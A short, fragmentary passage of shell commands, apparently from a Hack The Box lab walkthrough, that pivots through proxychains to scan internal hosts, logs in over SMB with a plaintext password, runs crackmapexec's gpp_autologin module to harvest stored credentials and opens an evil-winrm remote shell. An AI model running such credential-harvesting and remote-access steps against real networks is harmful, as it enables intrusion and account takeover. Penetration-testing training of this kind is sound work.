...
```shell-session
0xmid00@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20
...
```shell-session
0xmid00@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
...
```shell-session
0xmid00@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
...
```shell-session
0xmid00@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50
...
```shell-session
0xmid00@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 
